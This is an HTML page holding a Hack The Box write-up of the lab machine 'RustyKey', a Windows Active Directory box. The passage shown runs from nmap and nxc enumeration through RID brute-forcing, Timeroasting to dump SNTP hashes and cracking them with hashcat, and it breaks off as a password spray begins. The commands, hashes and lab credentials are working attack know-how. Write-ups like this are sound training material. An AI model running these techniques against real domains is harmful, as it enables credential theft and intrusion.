@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>RustyKey | Paracausal Telemetry</title><meta name="description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Kerberos environment setup, SMB (445), Timeroasting leads to account compromise." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-rustykey/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="RustyKey" /><meta property="og:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Kerberos environment setup, SMB (445), Timeroasting leads to account compromise." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-rustykey/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-rustykey/og.png?v=f029e315" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="RustyKey" /><meta name="twitter:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Kerberos environment setup, SMB (445), Timeroasting leads to account compromise." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-rustykey/og.png?v=f029e315" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"RustyKey","description":"Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Kerberos environment setup, SMB (445), Timeroasting leads to account compromise.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-rustykey/","datePublished":"2026-10-17","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"RustyKey","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-rustykey/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">RustyKey</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-10-17 · 17 min read</p><h1>RustyKey</h1><p>Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Kerberos environment setup, SMB (445), Timeroasting leads to account compromise.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · hard</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/RustyKey" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-rustykey.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-rustykey.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>RustyKey</h2><p>RustyKey is a hard difficulty Windows Machine which showcases a Timeroasting Attack, Active Directory ACL abuse following Windows Group Policy Enumeration to abuse the 7-Zip Shell Extension. For Privilege escalation, Active Directory Delegations are abused using a SPN-less…</p></div><span class="room-badge room-badge-hard">Hard</span></div><dl class="room-facts"><div><dt>Released</dt><dd>28 Jun 2025</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>EmSec</dd></div><div><dt>Rating</dt><dd>4.2 / 5</dd></div><div><dt>User owns</dt><dd>2,711</dd></div><div><dt>Root owns</dt><dd>2,161</dd></div><div><dt>User blood</dt><dd>NLTE<small class="room-blood-time">0H 24M 16S</small></dd></div><div><dt>Root blood</dt><dd>NLTE<small class="room-blood-time">1H 14M 24S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 2887 votes from easiest to hardest"><rect x="0" y="60" width="20" height="4" rx="2" fill="hsl(96 70% 55%)"><title>56 votes</title></rect><rect x="26" y="62" width="20" height="2" rx="2" fill="hsl(96 70% 55%)"><title>18 votes</title></rect><rect x="52" y="58" width="20" height="6" rx="2" fill="hsl(80 70% 55%)"><title>82 votes</title></rect><rect x="78" y="49" width="20" height="15" rx="2" fill="hsl(70 70% 55%)"><title>214 votes</title></rect><rect x="104" y="40" width="20" height="24" rx="2" fill="hsl(50 70% 55%)"><title>338 votes</title></rect><rect x="130" y="30" width="20" height="34" rx="2" fill="hsl(38 70% 55%)"><title>486 votes</title></rect><rect x="156" y="0" width="20" height="64" rx="2" fill="hsl(28 70% 55%)"><title>905 votes</title></rect><rect x="182" y="28" width="20" height="36" rx="2" fill="hsl(16 70% 55%)"><title>514 votes</title></rect><rect x="208" y="52" width="20" height="12" rx="2" fill="hsl(8 70% 55%)"><title>166 votes</title></rect><rect x="234" y="56" width="20" height="8" rx="2" fill="hsl(0 70% 55%)"><title>108 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 8.3, Real-Life 7.4, CVE 6.4, Custom Exploitation 3.6, CTF-Like 2.6"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,51.9 159.3,94.0 136.3,146.2 95.2,130.4 92.7,104.4" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/RustyKey" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Machine info</h2><p>As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">rr.parker:8#t5HE8L!W3A</code></pre><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ sudo nxc smb 10.129.232.127 --generate-hosts-file /etc/hosts 
+
+SMB         10.129.232.127  445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)</code></pre><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nmap -p- --min-rate=2000 -sT -Pn dc.rustykey.htb -vv 
+
+Nmap scan report for dc.rustykey.htb (10.129.232.127)
+Host is up, received user-set (0.013s latency).
+Scanned at 2026-10-17 18:59:01 BST for 10s
+Not shown: 65510 closed tcp ports (conn-refused)
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack
+88/tcp    open  kerberos-sec     syn-ack
+135/tcp   open  msrpc            syn-ack
+139/tcp   open  netbios-ssn      syn-ack
+389/tcp   open  ldap             syn-ack
+445/tcp   open  microsoft-ds     syn-ack
+464/tcp   open  kpasswd5         syn-ack
+593/tcp   open  http-rpc-epmap   syn-ack
+636/tcp   open  ldapssl          syn-ack
+3268/tcp  open  globalcatLDAP    syn-ack
+3269/tcp  open  globalcatLDAPssl syn-ack
+5985/tcp  open  wsman            syn-ack
+9389/tcp  open  adws             syn-ack
+47001/tcp open  winrm            syn-ack
+49664/tcp open  unknown          syn-ack
+49665/tcp open  unknown          syn-ack
+49666/tcp open  unknown          syn-ack
+49667/tcp open  unknown          syn-ack
+49671/tcp open  unknown          syn-ack
+49678/tcp open  unknown          syn-ack
+49679/tcp open  unknown          syn-ack
+49680/tcp open  unknown          syn-ack
+49681/tcp open  unknown          syn-ack
+49684/tcp open  unknown          syn-ack
+49700/tcp open  unknown          syn-ack</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -Pn -sT dc.rustykey.htb     
+Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-17 19:00 +0100
+Nmap scan report for dc.rustykey.htb (10.129.232.127)
+Host is up (0.014s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-18 02:00:27Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10|11|2012|2022|2016 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows 10 1709 - 22H2 (94%), Microsoft Windows 10 1909 (92%), Microsoft Windows 11 24H2 - 25H2 (92%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows 10 20H2 (90%), Microsoft Windows Server 2016 (90%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h2>Kerberos environment setup</h2><p>Since NTLM is disabled, ill have to set a realm and check the system time</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ ntpdate dc.rustykey.htb                                    
+2026-10-18 03:02:34.251970 (+0100) +28800.387956 +/- 0.007766 dc.rustykey.htb 10.129.232.127 s1 no-leap
+CLOCK: step_systime: Operation not permitted</code></pre><p>Looks like its running at +8h</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ sudo nxc smb dc.rustykey.htb --generate-krb5-file /etc/krb5.conf              
+SMB         10.129.232.127  445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         10.129.232.127  445    dc               [+] krb5 conf saved to: /etc/krb5.conf
+SMB         10.129.232.127  445    dc               [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf</code></pre><p>Then ill also create a krb5 conf file</p><h2>SMB (445)</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u &#39;rr.parker&#39; -p &#39;8#t5HE8L!W3A&#39; -k
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A</code></pre><h3>Shares</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u &#39;rr.parker&#39; -p &#39;8#t5HE8L!W3A&#39; -k --shares
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
+SMB         dc.rustykey.htb 445    dc               [*] Enumerated shares
+SMB         dc.rustykey.htb 445    dc               Share           Permissions     Remark
+SMB         dc.rustykey.htb 445    dc               -----           -----------     ------
+SMB         dc.rustykey.htb 445    dc               ADMIN$                          Remote Admin
+SMB         dc.rustykey.htb 445    dc               C$                              Default share
+SMB         dc.rustykey.htb 445    dc               IPC$            READ            Remote IPC
+SMB         dc.rustykey.htb 445    dc               NETLOGON        READ            Logon server share 
+SMB         dc.rustykey.htb 445    dc               SYSVOL          READ            Logon server share </code></pre><p>Just default shares</p><h3>Users</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u &#39;rr.parker&#39; -p &#39;8#t5HE8L!W3A&#39; -k --rid-brute 20000 | grep &#39;(SidTypeUser)&#39; | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC$
+Support-Computer1$
+Support-Computer2$
+Support-Computer3$
+Support-Computer4$
+Support-Computer5$
+Finance-Computer1$
+Finance-Computer2$
+Finance-Computer3$
+Finance-Computer4$
+Finance-Computer5$
+IT-Computer1$
+IT-Computer2$
+IT-Computer3$
+IT-Computer4$
+IT-Computer5$
+rr.parker
+mm.turner
+bb.morgan
+gg.anderson
+dd.ali
+ee.reed
+nn.marcos
+backupadmin</code></pre><p>Ill use <code>--rid-brute</code> to also get machine accounts</p><p>There is also no passwords stored in user descriptions</p><h2>Timeroasting leads to account compromise</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python"> ❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u &#39;rr.parker&#39; -p &#39;8#t5HE8L!W3A&#39; -k -M timeroast
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
+TIMEROAST   dc.rustykey.htb 445    dc               [*] Starting Timeroasting...
+TIMEROAST   dc.rustykey.htb 445    dc               1000:$sntp-ms$58e42695e13793a7ac09c2a96571fd30$1c0111e900000000000a04a34c4f434cee7ea5eff7feff4fe1b8428bffbfcd0aee7eac0cf7feda66ee7eac0cf7ff0cba
+TIMEROAST   dc.rustykey.htb 445    dc               1103:$sntp-ms$b9ecbbe1fe43365209086cedcb320f70$1c0111e900000000000a04a34c4f434cee7ea5eff7e806e4e1b8428bffbfcd0aee7eac0d97e7e8b2ee7eac0d97e812a3
+TIMEROAST   dc.rustykey.htb 445    dc               1104:$sntp-ms$e22c65382d88ff6ff5593d10efe5b74a$1c0111e900000000000a04a34c4f434cee7ea5eff96fdddee1b8428bffbfcd0aee7eac0d996fbdfdee7eac0d996fe99c
+TIMEROAST   dc.rustykey.htb 445    dc               1105:$sntp-ms$4d3f8d25065b35f591bf560f847a7d5e$1c0111e900000000000a04a34c4f434cee7ea5eff727b11ee1b8428bffbfcd0aee7eac0d9b40280eee7eac0d9b4051ff
+TIMEROAST   dc.rustykey.htb 445    dc               1106:$sntp-ms$56e030f220b985fbcbe79d6f19ce71da$1c0111e900000000000a04a34c4f434cee7ea5eff824935de1b8428bffbfcd0aee7eac0d9c3d145dee7eac0d9c3d30e2
+TIMEROAST   dc.rustykey.htb 445    dc               1107:$sntp-ms$863543b1fcdd02fdd9a55a18970e2573$1c0111e900000000000a04a34c4f434cee7ea5eff8ff7596e1b8428bffbfcd0aee7eac0d9d17f18eee7eac0d9d1819d2
+TIMEROAST   dc.rustykey.htb 445    dc               1118:$sntp-ms$21c5417ce9739758e1bb2755a10facc9$1c0111e900000000000a04a34c4f434cee7ea5eff83963cee1b8428bffbfcd0aee7eac0dac7298a3ee7eac0dac72c94b
+TIMEROAST   dc.rustykey.htb 445    dc               1119:$sntp-ms$ffc976752793ac99eff55dc78838c595$1c0111e900000000000a04a34c4f434cee7ea5eff98e5dfce1b8428bffbfcd0aee7eac0dadc79123ee7eac0dadc7c1cb
+TIMEROAST   dc.rustykey.htb 445    dc               1120:$sntp-ms$4bb96160951b16621f0b50c373983c14$1c0111e900000000000a04a34c4f434cee7ea5eff743576de1b8428bffbfcd0aee7eac0daf539ee3ee7eac0daf53c579
+TIMEROAST   dc.rustykey.htb 445    dc               1121:$sntp-ms$2f14d3aab8cf9a3612d8347a87422289$1c0111e900000000000a04a34c4f434cee7ea5eff8514211e1b8428bffbfcd0aee7eac0db0618987ee7eac0db061b01e
+TIMEROAST   dc.rustykey.htb 445    dc               1122:$sntp-ms$0899d0c314f856d070833104651045fd$1c0111e900000000000a04a34c4f434cee7ea5eff9ca247be1b8428bffbfcd0aee7eac0db1da5cd8ee7eac0db1da95e3
+TIMEROAST   dc.rustykey.htb 445    dc               1123:$sntp-ms$09101e4d745c7ff6d6b6e4c34cc1ff3b$1c0111e900000000000a04a34c4f434cee7ea5eff6fee045e1b8428bffbfcd0aee7eac0db327aa68ee7eac0db327e6ce
+TIMEROAST   dc.rustykey.htb 445    dc               1124:$sntp-ms$d663347313b12ddac598da83a9ebe137$1c0111e900000000000a04a34c4f434cee7ea5eff8103a09e1b8428bffbfcd0aee7eac0db4390936ee7eac0db4394240
+TIMEROAST   dc.rustykey.htb 445    dc               1125:$sntp-ms$890ca6c9c139f7f2d3c6ac3d2b7eb415$1c0111e900000000000a04a34c4f434cee7ea5eff9ba4002e1b8428bffbfcd0aee7eac0db5e310dbee7eac0db5e349e6
+TIMEROAST   dc.rustykey.htb 445    dc               1126:$sntp-ms$af472fe1eb42690da7f6d367afaf4de9$1c0111e900000000000a04a34c4f434cee7ea5eff7115d1fe1b8428bffbfcd0aee7eac0db7114247ee7eac0db7116a8b
+TIMEROAST   dc.rustykey.htb 445    dc               1127:$sntp-ms$e2796824b459f246f17d6c9300da4aac$1c0111e900000000000a04a34c4f434cee7ea5eff7f5290ce1b8428bffbfcd0aee7eac0db7f50e34ee7eac0db7f53678</code></pre><p>This has dumped several hashes out</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ cat timeroast.out | cut -d &#39;:&#39; -f 2 | tee timeroast.hash
+$sntp-ms$58e42695e13793a7ac09c2a96571fd30$1c0111e900000000000a04a34c4f434cee7ea5eff7feff4fe1b8428bffbfcd0aee7eac0cf7feda66ee7eac0cf7ff0cba
+$sntp-ms$b9ecbbe1fe43365209086cedcb320f70$1c0111e900000000000a04a34c4f434cee7ea5eff7e806e4e1b8428bffbfcd0aee7eac0d97e7e8b2ee7eac0d97e812a3
+$sntp-ms$e22c65382d88ff6ff5593d10efe5b74a$1c0111e900000000000a04a34c4f434cee7ea5eff96fdddee1b8428bffbfcd0aee7eac0d996fbdfdee7eac0d996fe99c
+$sntp-ms$4d3f8d25065b35f591bf560f847a7d5e$1c0111e900000000000a04a34c4f434cee7ea5eff727b11ee1b8428bffbfcd0aee7eac0d9b40280eee7eac0d9b4051ff
+$sntp-ms$56e030f220b985fbcbe79d6f19ce71da$1c0111e900000000000a04a34c4f434cee7ea5eff824935de1b8428bffbfcd0aee7eac0d9c3d145dee7eac0d9c3d30e2
+$sntp-ms$863543b1fcdd02fdd9a55a18970e2573$1c0111e900000000000a04a34c4f434cee7ea5eff8ff7596e1b8428bffbfcd0aee7eac0d9d17f18eee7eac0d9d1819d2
+$sntp-ms$21c5417ce9739758e1bb2755a10facc9$1c0111e900000000000a04a34c4f434cee7ea5eff83963cee1b8428bffbfcd0aee7eac0dac7298a3ee7eac0dac72c94b
+$sntp-ms$ffc976752793ac99eff55dc78838c595$1c0111e900000000000a04a34c4f434cee7ea5eff98e5dfce1b8428bffbfcd0aee7eac0dadc79123ee7eac0dadc7c1cb
+$sntp-ms$4bb96160951b16621f0b50c373983c14$1c0111e900000000000a04a34c4f434cee7ea5eff743576de1b8428bffbfcd0aee7eac0daf539ee3ee7eac0daf53c579
+$sntp-ms$2f14d3aab8cf9a3612d8347a87422289$1c0111e900000000000a04a34c4f434cee7ea5eff8514211e1b8428bffbfcd0aee7eac0db0618987ee7eac0db061b01e
+$sntp-ms$0899d0c314f856d070833104651045fd$1c0111e900000000000a04a34c4f434cee7ea5eff9ca247be1b8428bffbfcd0aee7eac0db1da5cd8ee7eac0db1da95e3
+$sntp-ms$09101e4d745c7ff6d6b6e4c34cc1ff3b$1c0111e900000000000a04a34c4f434cee7ea5eff6fee045e1b8428bffbfcd0aee7eac0db327aa68ee7eac0db327e6ce
+$sntp-ms$d663347313b12ddac598da83a9ebe137$1c0111e900000000000a04a34c4f434cee7ea5eff8103a09e1b8428bffbfcd0aee7eac0db4390936ee7eac0db4394240
+$sntp-ms$890ca6c9c139f7f2d3c6ac3d2b7eb415$1c0111e900000000000a04a34c4f434cee7ea5eff9ba4002e1b8428bffbfcd0aee7eac0db5e310dbee7eac0db5e349e6
+$sntp-ms$af472fe1eb42690da7f6d367afaf4de9$1c0111e900000000000a04a34c4f434cee7ea5eff7115d1fe1b8428bffbfcd0aee7eac0db7114247ee7eac0db7116a8b
+$sntp-ms$e2796824b459f246f17d6c9300da4aac$1c0111e900000000000a04a34c4f434cee7ea5eff7f5290ce1b8428bffbfcd0aee7eac0db7f50e34ee7eac0db7f53678</code></pre><p>I placed the output into a file, then ill cut the output so they are crackable</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python"> ❯❯❯ hashcat timeroast.hash /usr/share/wordlists/rockyou.txt -m 31300
+ 
+ $sntp-ms$890ca6c9c139f7f2d3c6ac3d2b7eb415$1c0111e900000000000a04a34c4f434cee7ea5eff9ba4002e1b8428bffbfcd0aee7eac0db5e310dbee7eac0db5e349e6:Rusty88!</code></pre><p>Only one of them cracked</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +8h nxc ldap dc.rustykey.htb -u users.txt -p &#39;Rusty88!&#39; -k --continue-on-success
+
+...[SNIP]...
+
